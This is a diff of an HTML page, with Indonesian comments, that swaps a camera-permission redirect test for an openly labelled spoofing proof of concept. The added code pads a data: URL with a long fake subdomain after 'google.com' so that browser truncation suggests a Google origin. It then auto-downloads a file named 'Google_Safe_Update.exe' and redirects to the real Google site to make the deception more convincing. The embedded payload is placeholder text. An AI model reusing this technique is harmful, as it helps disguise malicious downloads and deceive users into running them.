@@ -1,43 +1,42 @@
 <!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8">
-  <title>Camera Redirect</title>
-</head>
-<body>
-
-<button onclick="go()">Klik</button>
+<html>
+<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">
+    <h1 style="color:#0ff; text-shadow:0 0 15px #0ff;">[!] V398: SUBDOMAIN_STRIP_SPOOF</h1>
+    <div id="status" style="border:1px solid #333; padding:15px; margin:20px;">> STANDBY: READY FOR SUBDOMAIN BLOAT...</div>
+    
+    <button type="button" id="strikeBtn" style="padding:25px; background:#111; color:#0ff; border:2px solid #0ff; cursor:pointer; font-weight:bold;">
+        EXECUTE_SPOOF
+    </button>
 
 <script>
-function go() {
-  sessionStorage.setItem("clicked", "true");
-  location.reload();
-}
+    document.getElementById('strikeBtn').addEventListener('click', function() {
+        // 1. THE BLOAT LOGIC
+        // Kita membuat sub-domain yang sangat panjang. 
+        // UI Chrome Windows seringkali melakukan 'middle-truncation' (...) 
+        // sehingga yang tersisa hanya bagian awal (google.com) dan akhir.
+        const host = "google.com";
+        const padding = ".update-system-security-verified-check-secure-connection-origin";
+        const longSub = host + padding.repeat(10); 
+        
+        // 2. THE PAYLOAD
+        const payload = `data://${longSub}/;base64,ZXN0dGVzdGVzdHRlc3Q=`;
+        const filename = "Google_Safe_Update.exe";
 
-window.onload = async function() {
-  const clicked = sessionStorage.getItem("clicked");
+        // 3. TRIGGER DOWNLOAD
+        const a = document.createElement('a');
+        a.href = payload;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        
+        setTimeout(() => {
+            document.body.removeChild(a);
+            // Redirect ke google asli untuk memperkuat kesan origin
+            window.location.replace("https://www.google.com");
+        }, 150);
 
-  if (clicked === "true") {
-    sessionStorage.removeItem("clicked");
-
-    try {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
-        console.log("Kamera aktif");
-
-        // stop kamera biar tidak terus nyala
-        stream.getTracks().forEach(track => track.stop());
-      }
-    } catch (err) {
-      console.log("Akses kamera ditolak / gagal:", err);
-    }
-
-    // tetap redirect
-    window.location.href = "https://example.com";
-  }
-}
+        document.getElementById('status').innerText = "> STRIKE_SENT: CHECK chrome://downloads";
+    });
 </script>
-
 </body>
 </html>
